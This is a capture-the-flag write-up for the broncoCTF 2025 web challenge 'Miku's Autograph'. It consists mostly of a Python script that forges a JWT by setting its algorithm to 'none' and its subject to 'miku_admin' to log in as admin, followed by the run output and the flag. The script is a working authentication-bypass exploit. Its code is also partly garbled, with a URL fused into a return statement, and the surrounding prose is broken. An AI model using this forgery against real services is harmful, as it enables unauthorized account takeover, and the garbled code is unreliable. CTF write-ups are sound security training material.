 <title>broncocte2025---Miku's Autograph Writeup </title>
 

<!DOCTYPE html>
<html>
 
<body>
    <h1>broncocte2025---Miku's Autograph Writeup </h1>

    <h2>Challenge Description</h2>
    <p>  I am so proud of the fact that I have Miku's autograph. Ha! You don't!

<a href="https://miku.web.broncoctf.xyz/">https://miku.web.broncoctf.xyz</a>
</p>

    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol> 
        <li> 
we open https://miku.web.broncoctf.xyz/ via burp suit or script see that have /get_token sub domin that get jwt token 
so i ajwt token and becaouse two use so set user to miko admin to login in token.dev and get logging in cookies or below code is for jwt attack
</pre>
#! /usr/bin/env python3
import json
import base64
import requests
import sys

# Default values (Can be overridden via command-line arguments)
HOST = "https://miku.web.broncoctf.xyz/"  # Replace with actual host
MANUAL_TOKEN = None
ALG = "none"
SUB = "miku_admin"

#command line jwt attack  $python writeup3.py   $python writeup3.py https://miku.web.broncoctf.xyz/ eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibWlrdV9hZG1pbiIsICJleHAiOiAxNzM5ODYyOTkzfQ.sSV2yKwJxqelFbw7juf-hBODZNdjhXU5mmQgPPDpWxA
def parse_args():
    """Parses command-line arguments like 'alg=none sub=admin token=...'."""
    global HOST, ALG, SUB, MANUAL_TOKEN

    for arg in sys.argv[1:]:
        if "=" in arg:
            key, value = arg.split("=", 1)
            key, value = key.strip(), value.strip()

            if key == "host":
                HOST = value
            elif key == "alg":
                ALG = value
            elif key == "sub":
                SUB = value
            elif key == "token":
                MANUAL_TOKEN = value  # If token is provided, use it directly

def tweak_token(token: str) -> str:
    try:
        header, payload, signature = token.split(".")
        base64_decoded_header = json.loads(base64.b64decode(header + "==").decode())
        base64_decoded_payload = json.loads(base64.b64decode(payload + "==").decode())

        # Modify the token dynamically
        base64_decoded_header["alg"] = ALG
        base64_decoded_payload["sub"] = SUB

        header = base64.b64encode(json.dumps(base64_decoded_header).encode()).decode().replace("=", "")
        payload = base64.b64encode(json.dumps(base64_decoded_payload).encode()).decode().replace("=", "")
        cookie = f"{header}.{payload}.{signature}"

        msg_info(f"Tweaked Cookie is: {cookie}")
        return cookiehttps://miku.web.broncoctf.xyz
    except Exception as e:
        msg_info(f"Error tweaking token: {e}")
        return None

def get_token():
    if MANUAL_TOKEN:
        msg_info("Using manually provided token.")
        return MANUAL_TOKEN

    try:
        response = requests.get(f"{HOST}/get_token")
        if response.status_code != 200:
            msg_info(f"Failed to get token: {response.text}")
            return None

        token = json.loads(response.text).get("your_token")
        if not token:
            msg_info("No token found in response.")
            return None

        return token
    except Exception as e:
        msg_info(f"Error getting token: {e}")
        return None

def solve():
    parse_args()  # Process command-line arguments

    msg_info(f"Using host: {HOST}")
    msg_info(f"Using alg: {ALG}")
    msg_info(f"Using sub: {SUB}")

    msg_info("Retrieving the token...")
    token = get_token()
    
    if not token:
        msg_info("No valid token retrieved. Exiting.")
        return

    cookie = tweak_token(token)
    if not cookie:
        msg_info("Token tweaking failed. Exiting.")
        return

    data = {"token": cookie}

    try:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        response = requests.post(f"{HOST}/login", data=data, headers=headers)

        msg_info(f"Status Code: {response.status_code}")
        msg_info(f"Response Headers: {response.headers}")
        msg_info(f"Response Body: {response.text}")
    except Exception as e:
        msg_info(f"Error during login: {e}")

if __name__ == "__main__":
    
    solve()
</pre>
after running code will get token with below result
<code>
INFO] Retrieving the token...
[INFO] Tweaked Cookie is: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibWlrdV9hZG1pbiIsICJleHAiOiAxNzM5ODE3OTk3fQ.y8LSP8HaDWRVTEh6epW6Sb1cFiaa2N1XsAKWkd0g31A
[INFO] Status Code: 200
[INFO] Response Headers: {'Server': 'Werkzeug/3.1.3 Python/3.13.2', 'Date': 'Mon, 17 Feb 2025 18:36:38 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '88', 'Via': '1.1 google', 'Alt-Svc': 'h3=":443"; ma=2592000,h3-29=":443"; ma=2592000'}
[INFO] Response Body: <h2>Welcome, Miku Admin! Here's your flag: bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}</h2>

</code>
that have flag
</li>
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}
</p>

    <h2>Conclusion</h2>
    <p>this is a medium chanllenge for jwt attack and web exploitation</p>

</body>
</html>
